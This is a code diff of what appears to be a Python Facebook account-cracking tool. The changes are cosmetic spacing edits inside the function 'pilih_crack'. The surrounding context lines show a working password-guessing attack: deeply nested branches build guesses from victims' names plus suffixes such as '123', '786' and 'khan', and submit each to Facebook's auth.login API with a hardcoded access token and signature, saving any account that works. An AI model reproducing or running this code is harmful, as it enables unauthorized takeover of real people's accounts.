@@ -780,7 +780,7 @@ def pilih_crack():
 																	cek.close()
 																	cekpoint.append(user+pass7)
 																else:
-																	pass8 = b['last_name']+'12'
+																	pass8 = b['last_name'] + '12'
 																	data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 																	s = json.load(data)
 																	if 'access_token' in s:
@@ -794,7 +794,7 @@ def pilih_crack():
 																			cek.close()
 																			cekpoint.append(user+pass8)
 																		else:
-																			pass9 = b['last_name']+'123'
+																			pass9 = b['last_name'] + '123'
 																			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass9)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 																			s = json.load(data)
 																			if 'access_token' in s:
@@ -808,7 +808,7 @@ def pilih_crack():
 																					cek.close()
 																					cekpoint.append(user+pass9)
 																				else:
-																					pass10 = b['last_name']+'1234'
+																					pass10 = b['last_name'] + '1234'
 																					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass10)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 																					s = json.load(data)
 																					if 'access_token' in s:
@@ -822,7 +822,7 @@ def pilih_crack():
 																							cek.close()
 																							cekpoint.append(user+pass10)
 																						else:
-																							pass11 = b['last_name']+'12345'
+																							pass11 = b['last_name'] + '12345'
 																							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass11)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 																							s = json.load(data)
 																							if 'access_token' in s:
@@ -836,7 +836,7 @@ def pilih_crack():
 																									cek.close()
 																									cekpoint.append(user+pass11)
 																								else:
-																									pass12 = b['last_name']+'786'
+																									pass12 = b['last_name'] + '786'
 																									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass12)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 																									s = json.load(data)
 																									if 'access_token' in s:
@@ -850,7 +850,7 @@ def pilih_crack():
 																											cek.close()
 																											cekpoint.append(user+pass12)
 																										else:
-																											pass13 = b['last_name']+'1122'
+																											pass13 = b['last_name'] + '1122'
 																											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass13)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 																											s = json.load(data)
 																											if 'access_token' in s:
@@ -864,7 +864,7 @@ def pilih_crack():
 																													cek.close()
 																													cekpoint.append(user+pass13)
 																												else:
-																													pass14 = b['first_name']+'1122'
+																													pass14 = b['first_name'] + '1122'
 																													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass14)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 																													s = json.load(data)
 																													if 'access_token' in s:
@@ -920,7 +920,7 @@ def pilih_crack():
 																																					cek.close()
 																																					cekpoint.append(user+pass17)
 																																				else:
-																																					pass18 = b['first_name']+'khan'
+																																					pass18 = b['first_name'] + 'khan'
 																																					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass18)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 																																					s = json.load(data)
 																																					if 'access_token' in s:
